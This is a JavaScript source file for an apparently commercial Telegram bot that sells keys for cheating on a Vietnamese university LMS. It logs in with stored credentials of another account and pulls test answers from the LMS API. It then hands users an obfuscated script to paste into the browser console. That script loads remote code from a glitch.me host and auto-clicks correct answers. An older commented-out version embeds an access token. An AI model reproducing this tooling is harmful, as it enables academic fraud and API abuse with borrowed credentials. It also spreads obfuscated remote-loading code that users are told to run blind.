import getDataByQueryLMS from "../util/lms/getDataByQueryLMS.js";
import checkSetAccount from "../util/bot/checkSetAccount.js";
import typingMessage from "../util/bot/typingMessage.js";
import tracking from "../util/bot/tracking.js";
import loginLMS from "../util/lms/loginLMS.js";
import getUrlByUsername from "../util/lms/getUrlByUsername.js";
import Account from "../model/Account.js";
import Key from "../model/Key.js";
import htmlToText from "../util/htmlToText.js";
async function lms_exercise({ data, query }) {
  const message = query.message;
  const json = JSON.parse(data);
  const chat_id = message.chat.id;
  const message_id = message.message_id;
  try {
    const { editMessage } = await typingMessage(this, {
      chat_id,
      message:
        "Đợi chút nhé quá trình sẽ mất ~ 5 phút - Vui lòng không spam để tránh bị lỗi không mong muốn",
    });
    const isSetAccount = await checkSetAccount(chat_id);
    if (!isSetAccount.status) {
      await editMessage(isSetAccount.message, {
        reply_to_message_id: message_id,
      });
      return;
    }
    const accountData = await Account.findOne({
      chat_id,
    });
    const isKey = await Key.findOne({ key: accountData.key });
    if (!isKey || isKey.count < 1) {
      await editMessage(
        `Rất tiếc **KEY** của bạn hết lượt sử dụng rồi liên hệ [${global.ictu_data.ADMIN_NAME}](${global.ictu_data.CONTACT_URL}) để tăng thêm lượt nhé !`
      );
      return;
    }
    if (isKey.type !== "TEST") {
      await editMessage("**KEY** của bạn không dùng được chức năng này");
      return;
    }
    await Key.findOneAndUpdate(
      {
        key: accountData.key,
      },
      {
        count: isKey.count - 1,
      }
    );
    await editMessage(`Bắt đầu kiểm tra thông tin đăng nhập ...`);
    const { url, university, appId, origin } = getUrlByUsername(
      accountData.username
    );
    await tracking(this, message, [global.ictu_data.TELEGRAM_CHAT_ID_ADMIN]);

    let username = global.ictu_data.USERNAME_ICTU,
      password = global.ictu_data.PASSWORD_ICTU;
    if (university === "TUEBA") {
      username = global.ictu_data.USERNAME_TUEBA;
      password = global.ictu_data.PASSWORD_TUEBA;
    }
    const dataLoginOtherUser = await loginLMS({
      username,
      password,
    });
    if (dataLoginOtherUser.code !== "success") {
      await editMessage("eee lỗi tk rùi :V hiện không dùng chức năng này được");
      return;
    }
    const listVideoAndLessonData = await getDataByQueryLMS(
      `${url}/${global.ictu_data.LESSON_LMS}`,
      {
        query: {
          paged: 1,
          limit: 1000,
          orderby: "ordering",
          order: "ASC",
          select:
            "audio,video,other_video,slide,documents,id,course_id,parent_id,title,slug,type,ordering",
          "condition[0][key]": "course_id",
          "condition[0][value]": json.course_id,
          "condition[0][compare]": "=",
          "condition[1][key]": "status",
          "condition[1][value]": "1",
          "condition[1][compare]": "=",
          "condition[1][type]": "and",
        },
        token: dataLoginOtherUser.access_token,
      }
    );
    if (listVideoAndLessonData.code !== "success") {
      editMessage(listVideoAndLessonData.message);
      return;
    }
    if (listVideoAndLessonData.data.length < 1) {
      await editMessage("Không tìm thấy bài tập nào");
      return;
    }
    //sắp xếp lại thứ tự bài tập
    listVideoAndLessonData.data.sort((a, b) => a.parent_id - b.parent_id);
    let str = `**Danh sách đáp án từng bài**\n\n`;
    await editMessage(str);
    const listTextDataAnswer = [];
    for (const lessonOrTest of listVideoAndLessonData.data) {
      if (lessonOrTest.type === "TEST") {
        //         let text = `(async()=>{try{let e=e=>{let t=e=>(e||"")?.replace(/<[^>]*>/g,"")?.trim(),i=[...document.querySelectorAll("ul.v-step-answers__list")];if(!i){console.log("loi roi vui long thu lai");return}for(let n of i){let l=[...n.children];if(!l)return;for(let o of l){let r=o.querySelector("div > div > p"),c=o.querySelector("div > div > b");if(c&&(c=c.textContent.slice(8,-1).trim()),r.length<1){console.log(el.querySelector("div > div > b")?.textContent+" bị lỗi");continue}if("QUESTION"===e.type)r=t(r.textContent.trim());else if("QUESTION_IMAGE"===e.type&&r.outerHTML.includes("img")){r=r.outerHTML;let d='data-src="',a='"';r=r.slice(r.indexOf(d)+d.length,r.lastIndexOf(a))}else"QUESTION_CLOZE"===e.type&&(r=c);let s=[...o.querySelectorAll("ul > li"),];if(s.length<1)continue;let u=!1;for(let p of s){let y=p.querySelector("p");if("QUESTION"===e.type&&e.data[r]==y.textContent?.trim()&&Object.keys(e.data).includes(r)){u=!0;let f=p.querySelector("button");f?.click();continue}if("QUESTION_IMAGE"===e.type&&Object.keys(e.data).includes(r)&&y.outerHTML==e.data[r]){let g=p.querySelector("button");g?.click(),u=!0;continue}if("QUESTION_CLOZE"===e.type&&Object.keys(e.data).includes(c)&&y.outerHTML==e.data[c]){u=!0;let h=p.querySelector("button");h?.click();continue}}u||console.log(\`%c\${r}
        // %c\${e.data[r]}\`,"color: black; font-weight: bold; background-color: #fdfd96; padding: 5px; border-radius: 5px; font-size: 30px","color: white; font-weight: bold; background-color: green; padding: 5px; border-radius: 5px; font-size: 30px")}}},t=(e,t)=>{let i=e=>(e||"")?.replace(/<[^>]*>/g,"")?.trim();for(let{question_direction:n,answer_correct:l,answer_option:o,question_number:r}of e){if(!o)continue;let c=!1;if("<p></p>"!==n||n.includes("img")||(c=!0,t.type="QUESTION_CLOZE"),c){let d=o.find(e=>l.includes(e.id));t.data[r]=d.value;continue}if(n.includes("img")){t.type="QUESTION_IMAGE";let a='src="',s=n.slice(n.indexOf(a)+a.length,n.lastIndexOf('"')),u=o.find(e=>l.includes(e.id));t.data[s]=u.value}else{let p=o.find(e=>l.includes(e.id));t.data[i(n)]=i(p.value)}}},i={headers:{"content-type":"application/json","X-App-Id": atob('${Buffer.from(
        //           appId
        //         ).toString(
        //           "base64"
        //         )}'),origin:"${origin}",authorization:\`Bearer \${atob('${Buffer.from(
        //           dataLoginOtherUser.access_token
        //         ).toString("base64")}')}\`}},n=await fetch(atob('${btoa(
        //           `${`${url}/${global.ictu_data.LESSON_TEST_QUESTION_LMS}`}/?limit=1000&paged=1&select=id,lesson_id,test_id,question_number,question_direction,question_type,answer_option,group_id,part,media,answer_correct&condition[0][key]=lesson_id&condition[0][value]=${
        //             lessonOrTest.id
        //           }&condition[0][compare]==`
        //         )}'),i),l=await n.json(),o={data:{},type:"QUESTION"};t(l.data,o),e(o),console.log(\`%c\${decodeURIComponent('${encodeURIComponent(
        //           `Lưu ý: https://t.me/${global.ictu_data.USERNAME_BOT} có bán đáp án bài thi, bài kiểm tra Thi a2, tua nhanh các video LMS`
        //         )}')}\`,"color: red; font-weight: bold; padding: 5px; border-radius: 5px;font-size: 30px")}catch(r){console.error(r)}});`;
        const dataQuestion = await getDataByQueryLMS(
          `${url}/${global.ictu_data.LESSON_TEST_QUESTION_LMS}/`,
          {
            query: {
              paged: 1,
              limit: 1000,
              select:
                "id,lesson_id,test_id,question_number,question_direction,question_type,answer_option,group_id,part,media,answer_correct",
              "condition[0][key]": "lesson_id",
              "condition[0][value]": lessonOrTest.id,
              "condition[0][compare]": "=",
            },
            token: dataLoginOtherUser.access_token,
          }
        );

        const res = await fetch(
          `${global.ictu_data.URL_SERVER_GLITCH_2}/api/v1/`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              data: dataQuestion,
            }),
          }
        );
        const data = await res.json();

        let text = `>${htmlToText(
          lessonOrTest.title
        )}\n\`\`\`javascript\nfunction _0x11c4(_0x4c5584,_0x4da079){const _0xb986cb=_0xb986();return _0x11c4=function(_0x11c4cc,_0x53b9ed){_0x11c4cc=_0x11c4cc-0x1a7;let _0x3a99b3=_0xb986cb[_0x11c4cc];return _0x3a99b3;},_0x11c4(_0x4c5584,_0x4da079);}const _0x7d3b2f=_0x11c4;(function(_0x100fd4,_0x594ebe){const _0x6e4d71=_0x11c4,_0x1dd8d6=_0x100fd4();while(!![]){try{const _0x2e7d6d=parseInt(_0x6e4d71(0x1ad))/0x1*(-parseInt(_0x6e4d71(0x1b6))/0x2)+-parseInt(_0x6e4d71(0x1b4))/0x3+-parseInt(_0x6e4d71(0x1af))/0x4+-parseInt(_0x6e4d71(0x1b0))/0x5+-parseInt(_0x6e4d71(0x1b5))/0x6*(-parseInt(_0x6e4d71(0x1b2))/0x7)+-parseInt(_0x6e4d71(0x1b7))/0x8*(-parseInt(_0x6e4d71(0x1ae))/0x9)+-parseInt(_0x6e4d71(0x1b3))/0xa*(-parseInt(_0x6e4d71(0x1a9))/0xb);if(_0x2e7d6d===_0x594ebe)break;else _0x1dd8d6['push'](_0x1dd8d6['shift']());}catch(_0x4b390a){_0x1dd8d6['push'](_0x1dd8d6['shift']());}}}(_0xb986,0x82553));function _0xb986(){const _0x246c08=['log','data','929zgehfW','13095RjNsTF','469756FzaOyq','1734135OqKSHz','type','7FwIsrS','1874830fGgjIv','2309910FJOLUX','5040708QSvMFO','880ZEscPA','5288rpwEIC','src','parse',\`atob('${btoa(
          "https://heliotrope-ninth-scissor.glitch.me/script.js"
        )}')\`,\`atob('${btoa(
          data.data
        )}')\`,'appendChild','addEventListener','22BOELbp','load'];_0xb986=function(){return _0x246c08;};return _0xb986();}const _0x20c22d=document['createElement']('script');_0x20c22d[_0x7d3b2f(0x1b1)]='text/javascript',_0x20c22d[_0x7d3b2f(0x1b8)]=_0x7d3b2f(0x1ba),document['body'][_0x7d3b2f(0x1a7)](_0x20c22d),_0x20c22d[_0x7d3b2f(0x1a8)](_0x7d3b2f(0x1aa),async()=>{const _0x5d3ce3=_0x7d3b2f;try{const _0x15a5fc=await fetch(_0x5d3ce3(0x1bb)),_0x2a78f0=await _0x15a5fc['json']();console[_0x5d3ce3(0x1ab)](JSON[_0x5d3ce3(0x1b9)](decodeURIComponent(escape(atob(_0x2a78f0[_0x5d3ce3(0x1ac)]))))),BRAIN_KAR_2(JSON[_0x5d3ce3(0x1b9)](decodeURIComponent(escape(atob(_0x2a78f0[_0x5d3ce3(0x1ac)])))));}catch(_0x2543f2){console['log'](_0x2543f2);}});\`\`\`\n\n`;

        listTextDataAnswer.push(text);
      }
    }

    // let isFisrtMessage = true;
    // let i = 0;
    // for (const text of listTextDataAnswer) {
    //   i++;
    //   if (str.length + text.length > 4096) {
    //     if (isFisrtMessage) {
    //       await editMessage(str, {
    //         parse_mode: "MarkdownV2",
    //       });
    //       isFisrtMessage = false;
    //     } else {
    //       await this.sendMessage(chat_id, str, {
    //         parse_mode: "MarkdownV2",
    //       });
    //     }
    //     str = text;
    //   } else {
    //     str += text;
    //     if (i === listTextDataAnswer.length) {
    //       await this.sendMessage(chat_id, str, {
    //         parse_mode: "MarkdownV2",
    //       });
    //     }
    //   }
    // }
    // if (isFisrtMessage) {
    //   await editMessage(str, {
    //     parse_mode: "MarkdownV2",
    //   });
    // }

    let isFisrtMessage = true;
    let i = 0;
    // console.log(listTextDataAnswer);

    while (i <= listTextDataAnswer.length) {
      // console.log(str.length, listTextDataAnswer[i]);
      if(listTextDataAnswer[i] === undefined) break;
      if ((str.length + listTextDataAnswer[i].length) < 4096) {
        str += listTextDataAnswer[i] || "";
      } else {
        if (isFisrtMessage) {
          await editMessage(str, {
            parse_mode: "MarkdownV2",
          });
          isFisrtMessage = false;
          str = listTextDataAnswer[i] || "";
        } else {
          await this.sendMessage(chat_id, str, {
            parse_mode: "MarkdownV2",
          });
          str = listTextDataAnswer[i] || "";
        }
      }
      i++;
    }
    // console.log(str);

    if (isFisrtMessage) {
      await editMessage(str, {
        parse_mode: "MarkdownV2",
      });
    }
    if (str.length > 0) {
      await this.sendMessage(chat_id, str, {
        parse_mode: "MarkdownV2",
      });
    }
      await this.sendMessage(
        chat_id,
        `*Bước 1*: Vào bài tập muốn làm và ấn bắt đầu\n*Bước 2*: Bật F12\n*Bước 3*: Chọn mục console\n*Bước 4*: Dán code tương ứng ở trên (nhìn ý tên bài trong code nhé tránh nhầm bài) ⬆\n\n*Lưu ý*: Code chỉ dùng được 1 lần tránh dán code lung tung là mất lượt sử dụng không mong muốn nhé\n*Mua key liên hệ*: [${global.ictu_data.ADMIN_NAME}](${global.ictu_data.CONTACT_URL}) !`,
        {
          parse_mode: "Markdown",
        }
      );
  } catch (error) {
    console.error(error);
    await this.sendMessage(chat_id, `Quá trình thực hiện phát sinh ra lỗi vui lòng thử lại sau`, {
      reply_to_message_id: message_id,
    });
    return;
  }
}
export default lms_exercise;
